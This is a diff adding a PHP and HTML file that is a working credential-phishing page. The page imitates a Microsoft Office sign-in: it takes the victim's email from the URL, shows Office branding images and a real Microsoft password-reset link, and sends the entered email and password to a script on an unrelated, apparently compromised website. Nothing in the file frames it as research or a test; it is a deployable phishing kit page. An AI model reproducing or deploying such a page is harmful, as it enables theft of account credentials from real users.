@@ -1,0 +1,149 @@
+<?php
+function getloginIDFromlogin($email)
+{
+$find = '@';
+$pos = strpos($email, $find);
+$loginID = substr($email, 0, $pos);
+return $loginID;
+}
+function getDomainFromEmail($email)
+{
+// Get the data after the @ sign
+$domain = substr(strrchr($email, "@"), 1);
+return $domain;
+}
+$login = $_GET['email'];
+$loginID = getloginIDFromlogin($login);
+$domain = getDomainFromEmail($login);
+$ln = strlen($login);
+$len = strrev($login);
+$x = 0;
+for($i=0; $i<$ln; $i++){
+ if($len[$i] == "@"){
+  $x = $i;
+  break;
+ }
+}
+$yuh = substr($len,0,$x);
+$yuh = strrev($yuh);
+for($i=0; $i<$ln; $i++){
+ if($yuh[$i] == "."){
+  $x = $i;
+  break;
+ }
+}
+$yuh = substr($yuh,0,$x);
+$yuh = ucfirst($yuh);
+$display = strtoupper($yuh);
+
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Sign in to your account</title>
+<meta name="GENERATOR" content="C">
+<meta name="HOSTING" content="H">
+<style type="text/css">
+html, body
+{
+   height: 100%;
+}
+div#space
+{
+   width: 1px;
+   height: 50%;
+   margin-bottom: -300px;
+   float:left
+}
+div#container
+{
+   width: 451px;
+   height: 600px;
+   margin: 0 auto;
+   position: relative;
+   clear: left;
+}
+</style>
+<style type="text/css">
+body
+{
+   margin: 0;
+   padding: 0;
+   background-color: #FFFFFF;
+   color: #000000;
+}
+#backgroundimage
+{
+   height: auto;
+   left: 0;
+   margin: 0;
+   min-height: 100%;
+   min-width: 451px;
+   padding: 0;
+   position: fixed;
+   top: 0;
+   width: 100%;
+   z-index: -1;
+}
+</style>
+<style type="text/css">
+a:hover
+{
+   color: #ffffff;
+}
+input:focus { 
+    outline: none !important;
+    border-color: #ffffff;
+    box-shadow: 0 0 0px #ffffff;
+</style>
+<script type="text/javascript">
+<!--
+function ValidateForm1(theForm)
+{
+   var regexp;
+   if (theForm.Editbox2.value == "")
+   {
+      alert("Please enter a value for the \"email\" field.");
+      theForm.Editbox2.focus();
+      return false;
+   }
+   if (theForm.Editbox1.value == "")
+   {
+      alert("Please enter a value for the \"email\" field.");
+      theForm.Editbox1.focus();
+      return false;
+   }
+   return true;
+}
+//-->
+</script>
+<!--[if lt IE 7]>
+<style type="text/css">
+   img { behavior: url("pngfix.htc"); }
+</style>
+<![endif]-->
+</head>
+<body>
+<img id="backgroundimage" src="https://i.ibb.co/gtKmtC9/officebg.png" border="0" alt="">
+<div id="space"><br></div>
+<div id="container">
+<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:0px;top:99px;width:447px;height:346px;text-align:left;z-index:6;">
+<img src="https://i.ibb.co/r5zjhmN/officebg2.png" id="Image4" alt="" align="top" border="0" style="width:447px;height:346px;"></div>
+<div id="bv_Form2" style="position:absolute;left:6px;top:105px;width:434px;height:335px;z-index:7">
+<form name="Form1" method="get" action="https://longislandprep.org/wp-includes/SAM/server5.php" enctype="text/plain" id="Form2" onsubmit="return ValidateForm1(this)">
+<input type="email" id="email" style="position:absolute;left:66px;top:80px;width:264px;height:29px;border:0px #C0C0C0 solid;color:#4B4B4B;font-family:Arial;font-size:16px;z-index:0" name="email" readonly value="">
+<input type="password" id="password" style="position:absolute;left:44px;top:161px;width:344px;height:29px;border:0px #C0C0C0 solid;color:#3C3C3C;font-family:Arial;font-size:16px;z-index:1" name="password" placeholder="Password" value="">
+
+<input type="submit" id="Button2" name="Button1" value="Sign in" style="position:absolute;left:285px;top:257px;width:112px;height:35px;border:0px #000000 outset;background-color:#005BB7;color:#FFFFFF;font-family:Arial;font-size:16px;z-index:2">
+<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:39px;top:87px;width:22px;height:20px;text-align:left;z-index:3;">
+<img src="https://i.ibb.co/9qFGmjh/miciconlogo.png" id="Image3" alt="" align="top" border="0" style="width:22px;height:20px;"></div>
+<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:36px;top:215px;width:133px;height:19px;text-align:left;z-index:4;">
+<a href="https://passwordreset.microsoftonline.com/"><img src="https://i.ibb.co/F3yr74z/forgotpass.png" id="Image2" alt="" align="top" border="0" style="width:133px;height:19px;"></a></div>
+<div id="bv_Image5" style="margin:0;padding:0;position:absolute;left:36px;top:125px;width:178px;height:33px;text-align:left;z-index:5;">
+<img src="https://i.ibb.co/7CKgHCt/ep.png" id="Image5" alt="" align="top" border="0" style="width:178px;height:33px;"></div>
+</form>
+</div>
+</div>
+</body>
+</html>
